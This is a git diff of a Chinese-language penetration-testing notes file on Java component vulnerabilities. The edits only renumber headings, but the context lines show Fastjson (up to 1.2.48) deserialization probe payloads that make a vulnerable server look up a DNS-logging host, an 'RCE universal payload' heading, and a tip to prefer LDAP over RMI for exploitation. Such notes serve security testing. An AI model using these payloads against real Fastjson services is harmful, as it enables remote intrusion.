@@ -2,9 +2,8 @@
 
 # JAVA组件漏洞
 
-[TOC]
 
-- [Fastjson](#1. Fastjson)
+- [Fastjson](#Fastjson)
 
 - [Apache-Poi](#Apache-poi)
 
@@ -12,11 +11,11 @@
 
   
 
-## 1. Fastjson
+## Fastjson
 
-### 	1.1 版本 <= 1.2.48
+### 版本 <= 1.2.48
 
-### 		1.1.1 回显
+### 回显
 
 ```
 ======= 回显 =======
@@ -30,7 +29,7 @@ Set[{"@type":"java.net.URL", "val":"dnslog"}
 {{"@type":"java.net.URL", "val":"dnslog"}:0
 ```
 
-### 		1.1.2  RCE
+### RCE
 
 ```
 ======= 通杀payload =======
@@ -47,7 +46,7 @@ Set[{"@type":"java.net.URL", "val":"dnslog"}
 }
 ```
 
-### 		1.1.3 利用要点
+### 利用要点
 
 (备注：根据实战中经验，更推荐使用Ldap协议进行漏洞利用）
 
@@ -61,6 +60,6 @@ LDAP的利用方式要优于RMI, 且LDAP可以直接返回序列化对象, 绕�
 
 
 
-## 2. Apache-poi
+## Apache-poi
 
-## 3. Shiro
+## Shiro
